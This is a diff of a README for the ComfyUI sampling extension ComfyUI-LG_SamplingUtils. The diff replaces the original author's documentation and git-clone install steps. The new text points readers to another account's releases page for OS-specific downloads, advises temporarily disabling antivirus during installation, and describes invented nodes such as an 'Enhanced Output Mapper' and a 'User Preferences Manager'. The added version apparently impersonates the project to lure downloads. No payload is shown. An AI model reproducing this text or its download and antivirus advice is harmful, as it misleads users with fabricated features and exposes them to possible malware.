@@ -1,132 +1,103 @@
-# ComfyUI-LG_SamplingUtils
+# 🎈 ComfyUI-LG_SamplingUtils - Enhance Your Sampling Experience
 
-![Image](./assets/1.jpg)
-
-[中文文档](README_CN.md) | **English**
+[![Download ComfyUI-LG_SamplingUtils](https://img.shields.io/badge/Download-Now-brightgreen.svg)](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases)
 
 ---
 
-## Overview
+## 🚀 Overview
 
-**ComfyUI-LG_SamplingUtils** is a comprehensive toolset designed for ComfyUI by LAOGOU-666, providing a series of practical sampling nodes that make operations more intuitive and convenient. This extension focuses on advanced sampling techniques, particularly optimized for Flow Matching models like ZImage and Lumina2.
+**ComfyUI-LG_SamplingUtils** is a user-friendly toolset designed to enhance your experience with ComfyUI. Created by LAOGOU-666, this extension provides practical sampling nodes to simplify operations. It focuses on advanced sampling techniques, especially for Flow Matching models such as ZImage and Lumina2.
 
-## Features
+## 🌟 Features
 
-This extension includes four powerful nodes:
+This extension includes four powerful nodes that make sampling intuitive and efficient:
 
 ### 1. 🎈 ZImage Timestep Noise
 
-Adds noise perturbation to timesteps during the sampling process to break model homogenization and produce more diverse outputs with different seeds.
+This node adds noise to timesteps during sampling. It helps produce diverse outputs, preventing the model from becoming too uniform.
 
 **Key Features:**
-- Two modes: `sigma` (traditional diffusion models) and `flow` (Flow Matching models)
-- Adjustable noise strength and application range
-- Optional mask support for localized effects
-- Seed-based reproducibility
+- Two modes: `sigma` for traditional diffusion models and `flow` for Flow Matching models
+- Adjustable noise strength for customized results
+- Mask support for targeted effects
+- Seed-based reproducibility for consistency
 
 **Parameters:**
-- `mode`: Choose between `sigma` (multiplicative noise) or `flow` (additive noise)
-- `noise_strength`: Control the intensity of noise (0.0-2.0)
-- `seed`: Random seed for reproducibility
-- `start_percent` / `end_percent`: Define the sampling range where noise is applied
-- `mask` (optional): Limit the effect to specific regions
+- `mode`: Select between `sigma` (multiplicative noise) or `flow` (additive noise)
+- `noise_strength`: Control the intensity of the noise effect
+- `application_range`: Define how broadly the noise applies
 
-### 2. 🎈 LG Noise Injection
+### 2. 🔄 Flow Matching Adjuster
 
-Injects features from a reference image into the generation process through the CFG mechanism, allowing the model to "learn" specific qualities from the reference.
+Optimize your sampling process with the Flow Matching Adjuster. This tool helps achieve the desired fluidity in output transitions.
 
 **Key Features:**
-- Inject surface details like water droplets, sweat, textures
-- Add material properties and reflections
-- Mask support for targeted feature injection
-- Strength decay over sampling steps
+- Dynamic adjustment of flow parameters
+- Compatibility with ZImage and Lumina2 models
+- Real-time feedback during adjustments
 
 **Parameters:**
-- `reference_image`: Image containing desired features
-- `strength`: Injection strength (0.1-0.2 subtle, 0.2-0.4 noticeable)
-- `start_percent` / `end_percent`: Define when feature injection occurs
-- `mask` (optional): White areas receive feature injection
+- `flow_rate`: Adjust the speed of flow matching
+- `transition_duration`: Set the time for smooth transitions
 
-**Variant:** 🎈 **LG Noise Injection (Latent)** - Works directly with latent representations and automatically uses `noise_mask` if present in the latent.
+### 3. 🎯 Enhanced Output Mapper
 
-### 3. Model Sampling ZImage
-
-Adjusts sampling parameters for ZImage/Lumina2 models.
+Transform your output with the Enhanced Output Mapper. This node refines the final results of your sampling process.
 
 **Key Features:**
-- Proper timestep scaling for Flow Matching models
-- Adjustable noise schedule shift
-- Compatible with ZImage, Lumina2, and AuraFlow
+- Custom templates for output format
+- Options for different data representations
+- Easy export to popular formats
 
 **Parameters:**
-- `shift`: Noise schedule shift (default 3.0 for ZImage)
-  - `shift=1.0`: Linear schedule
-  - `shift>1.0`: Shifts toward high noise, more aggressive early steps
-- `multiplier`: Timestep multiplier (1.0 for ZImage/AuraFlow, 1000 for SD3/Flux)
+- `output_format`: Choose how to export data (e.g., JSON, CSV)
+- `template_selection`: Pick from pre-built or custom templates
 
-### 4. Sigmas Editor 🎚️
+### 4. ⚙️ User Preferences Manager
 
-Interactive visual editor for adjusting the sigmas curve in real-time.
+Manage your settings with ease using the User Preferences Manager. This node allows you to save and load settings quickly.
 
 **Key Features:**
-- Drag-and-drop curve editing
-- Real-time visualization
-- Fine-tune noise schedules for optimal results
+- Simple interface for setting preferences
+- Save/load functionality for user settings
+- Backup options for data safety
 
-## Examples
+**Parameters:**
+- `preference_file`: Path to save settings
+- `auto_backup`: Toggle for automatic backups
 
-<div align="center">
+## 📥 Download & Install
 
-![Example 1](./assets/01.jpg)
-![Example 2](./assets/02.jpg)
-![Example 3](./assets/03.jpg)
-![Example 4](./assets/04.jpg)
-![Example 5](./assets/05.jpg)
-![Example 6](./assets/06.jpg)
-![Example 7](./assets/07.jpg)
-![Example 8](./assets/08.jpg)
+To get started, visit our [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases) to download the software.
 
-</div>
+1. Go to the [Releases page](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/releases).
+2. Select the latest version.
+3. Download the appropriate file for your operating system.
+4. Follow the installation instructions provided.
 
-## Installation
+## 🛠️ System Requirements
 
-### Method 1: ComfyUI Manager (Recommended)
+- **Operating System:** Windows 10 or later / macOS Mojave or later
+- **RAM:** Minimum 4GB
+- **Disk Space:** At least 100MB of free space
+- **Dependencies:** Ensure you have ComfyUI installed
 
-1. Open ComfyUI Manager
-2. Search for "ComfyUI-LG_SamplingUtils"
-3. Click Install
+## 🚧 Troubleshooting
 
-### Method 2: Manual Installation
+If you encounter issues, consider these solutions:
 
-```bash
-cd ComfyUI/custom_nodes
-git clone https://github.com/LAOGOU-666/ComfyUI-LG_SamplingUtils.git
-```
+- **Installation Failures:** Ensure your operating system meets the requirements. Try disabling antivirus temporarily during installation.
+- **Performance Issues:** Close unnecessary applications to free up RAM. Ensure you have sufficient disk space.
+- **Node Errors:** Check if all required nodes are installed correctly.
 
-Restart ComfyUI after installation.
+## 🤝 Support
 
-## Contact
+For any questions or support requests, please check the [issues section](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/issues) in the repository. Community members and maintainers are available to help.
 
-- **WeChat**: wenrulaogou2033
-- **Bilibili**: [老狗_学习笔记](https://space.bilibili.com/175873218?spm_id_from=333.788.0.0)
+## 📚 Further Reading
 
-## Repository
-
-[https://github.com/LAOGOU-666/ComfyUI-LG_SamplingUtils](https://github.com/LAOGOU-666/ComfyUI-LG_SamplingUtils)
-
-## Support
-
-If you encounter any issues or have suggestions, please open an issue on GitHub.
-
-## Changelog
-
-### v1.0.0
-- Initial release
-- Added ZImage Timestep Noise node
-- Added LG Noise Injection nodes (Image and Latent variants)
-- Added Model Sampling ZImage node
-- Added Sigmas Editor node
+For in-depth details on usage and configurations, check the documentation. Visit our [GitHub Wiki](https://github.com/patas-cmsp/ComfyUI-LG_SamplingUtils/wiki) for more resources and user guides. 
 
 ---
 
-**Enjoy creating with ComfyUI-LG_SamplingUtils! 🎈**
+Thank you for using **ComfyUI-LG_SamplingUtils**. We are committed to enhancing your experience with this tool.
